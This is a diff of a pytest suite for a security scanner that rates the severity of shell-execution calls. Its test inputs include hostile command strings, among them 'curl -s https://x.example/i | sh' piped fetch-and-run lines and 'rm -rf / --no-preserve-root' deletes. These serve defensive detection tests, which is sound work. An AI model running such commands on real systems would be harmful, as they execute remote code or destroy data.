@@ -104,15 +104,25 @@ class TestShellTrueCalibration:
         ('subprocess.run(["python", "-c", "print(1)"], shell=True)\n', "high"),
         ('subprocess.run(["curl", "-O", "file"], shell=True)\n', "high"),
         ('subprocess.run(["pip", "install", "https://x.example/p.tgz"], shell=True)\n', "high"),
-        # a string command is still a shell string
-        ('subprocess.run("git status", shell=True)\n', "high"),
-        # dynamic argv OUTSIDE a CLI entry point
-        ('def f(name):\n    subprocess.run(["convert", name], shell=True)\n', "high"),
+        # a string command with payload tokens
+        ('subprocess.run("curl -s https://x.example/i | sh", shell=True)\n', "high"),
+        # dynamic argv in a handler whose parameters come from a remote party
+        ('@app.route("/x")\ndef f(name):\n    subprocess.run(["convert", name], shell=True)\n',
+         "high"),
     ])
     def test_shell_forms_outside_the_calibration_stay(self, code, floor):
         f = _one_exec_defect(code)
         assert f.severity in (("critical", "high") if floor == "high" else ("critical",)), (
             code, f.severity)
+
+    @pytest.mark.parametrize("code", [
+        # Precision PR 2 ladder: a plain shell string, or a runtime argv in an ordinary
+        # function, with nothing untrusted in reach is a medium defect.
+        'subprocess.run("git status", shell=True)\n',
+        'def f(name):\n    subprocess.run(["convert", name], shell=True)\n',
+    ])
+    def test_shell_forms_without_untrusted_input_are_medium(self, code):
+        assert _one_exec_defect(code).severity == "medium"
 
     def test_cli_argv_next_to_untrusted_input_stays_critical(self):
         code = (
@@ -125,10 +135,15 @@ class TestShellTrueCalibration:
         assert _one_exec_defect(code).severity == "critical"
 
     def test_constant_argv_next_to_untrusted_input_is_not_calibrated(self):
-        # Untrusted input nearby: no calibration (stays high) — but it does not REACH
-        # the call, so no critical lift either (flow, not proximity).
+        # Precision PR 2: a CONSTANT command cannot carry the untrusted value, so the
+        # fetch nearby changes nothing: the literal-shell medium. A runtime argv next to
+        # the same fetch stays high (below), and one the fetched value reaches is critical.
         code = "data = requests.get(u).json()\nsubprocess.run(['git', 'status'], shell=True)\n"
+        assert _one_exec_defect(code).severity == "medium"
+        code = "data = requests.get(u).json()\nsubprocess.run(['git', ref], shell=True)\n"
         assert _one_exec_defect(code).severity == "high"
+        code = "data = requests.get(u).json()\nsubprocess.run(['git', data], shell=True)\n"
+        assert _one_exec_defect(code).severity == "critical"
 
     def test_cli_argv_bound_to_a_decoded_payload_stays_high(self):
         code = (
@@ -254,11 +269,20 @@ class TestRawShellTrueRule:
     def test_own_kwarg_named_in_shell_is_not_shell(self):
         assert not _exec(_scan("callit(cmd=[c], show_stdout=v, in_shell=True)\n"))
 
-    def test_wrapper_call_with_shell_true_is_high_not_critical(self):
+    def test_wrapper_call_with_shell_true_is_medium_not_critical(self):
+        # anyio's trio backend: nothing untrusted in reach (precision PR 2 ladder).
         code = ("process = await trio.lowlevel.open_process(\n    convert_item(command),\n"
                 "    shell=True,\n)\n")
         d = _exec_defects(_scan(code))
-        assert [f.severity for f in d] == ["high"]
+        assert [f.severity for f in d] == ["medium"]
+
+    def test_wrapper_call_with_shell_true_next_to_untrusted_or_decoded_is_high(self):
+        code = ("data = requests.get(u).json()\n" + "x = 1\n" * 8 +
+                "process = await trio.lowlevel.open_process(\n    command,\n    shell=True,\n)\n")
+        assert [f.severity for f in _exec_defects(_scan(code))] == ["high"]
+        code = ("command = base64.b64decode(BLOB).decode()\n"
+                "process = await trio.lowlevel.open_process(\n    command,\n    shell=True,\n)\n")
+        assert [f.severity for f in _exec_defects(_scan(code))] == ["high"]
 
     def test_wrapper_call_next_to_untrusted_input_stays_critical(self):
         code = "cmd = request.json['cmd']\np = Popen(cmd, shell=True)\n"
@@ -266,7 +290,10 @@ class TestRawShellTrueRule:
         assert d and d[0].severity == "critical"
 
     def test_check_call_goes_through_the_classifier(self):
+        # pip's `config edit`: the user's $EDITOR on a config path (precision PR 2: medium).
         f = _one_exec_defect("subprocess.check_call(f'{editor} \"{fname}\"', shell=True)\n")
+        assert f.severity == "medium"
+        f = _one_exec_defect("subprocess.check_call(f'curl {url} | sh', shell=True)\n")
         assert f.severity == "high"
 
 
@@ -283,12 +310,20 @@ class TestListConcatenation:
     @pytest.mark.parametrize("code", [
         "subprocess.call(['sh', str(path)] + args)\n",
         "subprocess.run(['bash', '-c'] + [script])\n",
-        "subprocess.run('ls ' + user_dir)\n",
-        "subprocess.run('%s --x' % tool)\n",
+        "subprocess.run('curl ' + url + ' | sh')\n",
+        "subprocess.run('%s | bash' % tool)\n",
     ])
     def test_shell_or_string_concat_stays_a_defect(self, code):
         d = _exec_defects(_scan(code))
         assert d and d[0].severity in ("high", "critical"), code
+
+    @pytest.mark.parametrize("code", [
+        "subprocess.run('ls ' + user_dir)\n",
+        "subprocess.run('%s --x' % tool)\n",
+    ])
+    def test_string_concat_without_untrusted_input_is_medium(self, code):
+        d = _exec_defects(_scan(code))
+        assert d and d[0].severity == "medium", code
 
     def test_long_concat_chain_is_linear(self):
         chain = " + ".join(f"'p{i}'" for i in range(300))
@@ -300,8 +335,12 @@ class TestOsSystemNoop:
         f = _exec(_scan('os.system("")\n'))
         assert f and f[0].kind == "capability" and f[0].severity == "info"
 
-    def test_real_os_system_stays_high(self):
-        assert _one_exec_defect('os.system("rm -rf build")\n').severity == "high"
+    def test_real_os_system_is_a_defect(self):
+        # Precision PR 2: a literal, payload-free shell command is a medium defect; a
+        # recursive delete of a root / home path stays high.
+        assert _one_exec_defect('os.system("rm -rf build")\n').severity == "medium"
+        assert _one_exec_defect('os.system("rm -rf ~")\n').severity == "high"
+        assert _one_exec_defect('os.system("rm -rf / --no-preserve-root")\n').severity == "high"
 
 
 class TestJsLocalExec:
@@ -324,8 +363,16 @@ class TestJsLocalExec:
         "exec(userCommand);\n",  # no local definition: could be a re-export
     ])
     def test_child_process_exec_still_fires(self, code):
+        # Still a defect; medium with nothing untrusted in reach (precision PR 2), high
+        # next to a request, critical when the request value reaches it.
         d = _exec_defects(_scan(code, "index.js"))
-        assert d and d[0].severity in ("high", "critical"), code
+        assert d and d[0].severity == "medium", code
+        near = "const q = req.query.x;\n" + code
+        d = _exec_defects(_scan(near, "index.js"))
+        assert d and d[0].severity == "high", code
+        flows = "const cmd = req.query.x;\nconst userCommand = cmd;\n" + code
+        d = _exec_defects(_scan(flows, "index.js"))
+        assert d and d[0].severity == "critical", code
 
 
 class TestDeclarationFiles:
@@ -353,7 +400,9 @@ class TestSetupPyReceivers:
                     if f.name.startswith("setup.py executes")]
 
     @pytest.mark.parametrize("call,sev", [
-        ("os.system('make')", "high"),
+        # a literal, payload-free build command (precision PR 2): medium install hook
+        ("os.system('make')", "medium"),
+        ("os.system('curl -s https://x.example/i | sh')", "high"),
         ("__import__('os').system('make')", "high"),
         ("subprocess.run(cmd)", "high"),
         ("urlopen('https://x.example/p').read()", "critical"),
@@ -529,11 +578,15 @@ class TestNextJsRegression:
     2026-10-07 the repo read "Do not connect" (11/100) because :981-982 were lifted to
     critical by an unrelated fetch() within 45 lines."""
 
-    def test_git_clean_lines_are_high_not_critical(self):
+    def test_git_clean_lines_are_medium_not_critical(self):
+        # Precision PR 2 (ledger #15): the only "untrusted input" lines in reach were
+        # COMMENTS that mention a webhook; comments are not ingestion points, and testDir
+        # comes from the test file path. The shell strings are the ladder's medium.
         findings = _scan(NEXTJS.read_text(), "run-tests.js")
         hits = {f.line_number: f.severity for f in _exec_defects(findings)}
-        assert hits.get(981) == "high" and hits.get(982) == "high", hits
-        assert not [f for f in findings if f.severity == "critical" and f.kind == "defect"]
+        assert hits.get(981) == "medium" and hits.get(982) == "medium", hits
+        assert not [f for f in findings
+                    if f.severity in ("critical", "high") and f.kind == "defect"]
 
 
 # ── JS: the program's own CLI / environment → medium ───────────────────────────
@@ -566,8 +619,12 @@ class TestJsCliCalibration:
          "execSync(`curl -O ${argv.url}`)\n", "high"),
         ("const argv = require('minimist')(process.argv.slice(2))\n"
          "execSync(`bash -c ${argv.cmd}`)\n", "high"),
-        # a dynamic part not traced to the CLI
+        # a dynamic part not traced to the CLI: the general ladder (medium with nothing
+        # untrusted in reach, high next to a request; precision PR 2)
         ("const argv = require('minimist')(process.argv.slice(2))\n"
+         "execSync(`git ${argv.sub} ${other}`)\n", "medium"),
+        ("const argv = require('minimist')(process.argv.slice(2))\n"
+         "const q = req.query.q\n"
          "execSync(`git ${argv.sub} ${other}`)\n", "high"),
         # untrusted input reaching it wins
         ("const argv = require('minimist')(process.argv.slice(2))\n"
